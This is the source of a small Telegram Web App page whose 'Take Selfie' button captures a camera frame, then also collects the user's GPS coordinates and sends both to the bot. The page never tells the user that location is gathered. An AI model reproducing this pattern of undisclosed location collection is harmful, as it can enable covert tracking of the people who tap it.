<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>One-Tap Selfie</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    #takeSelfie {
      display: block;
      width: 100%;
      height: 70px;
      font-size: 20px;
      line-height: 70px;
      text-align: center;
      margin: 20px 0;
      border: none;
      background: #0088cc;
      color: #fff;
      border-radius: 8px;
    }
    body {
      padding: 10px;
      font-family: sans-serif;
    }
  </style>
</head>
<body>
  <button id="takeSelfie">ðŸ¤³ Take Selfie</button>
  <video id="v" autoplay playsinline style="display:none;"></video>
  <canvas id="c" style="display:none;"></canvas>

  <script>
    Telegram.WebApp.ready();

    // Listen for the button click
    document.getElementById('takeSelfie').addEventListener('click', async () => {
      const video = document.getElementById('v');
      const canvas = document.getElementById('c');

      try {
        // Request camera access
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        await video.play();

        // Once video is playing, capture the first frame
        video.addEventListener('loadeddata', async () => {
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          canvas.getContext('2d').drawImage(video, 0, 0);

          // Stop camera stream
          stream.getTracks().forEach(t => t.stop());

          // Get user's geolocation
          navigator.geolocation.getCurrentPosition(pos => {
            const payload = {
              image: canvas.toDataURL('image/jpeg'),
              location: {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude
              },
              date: new Date().toISOString()
            };

            // Send data to Telegram bot
            Telegram.WebApp.sendData(JSON.stringify(payload));
            Telegram.WebApp.close();
          }, err => {
            alert("Error accessing location: " + err.message);
            Telegram.WebApp.close();
          });
        });
      } catch (error) {
        alert("Error accessing camera: " + error.message);
        Telegram.WebApp.close();
      }
    });
  </script>
</body>
</html>
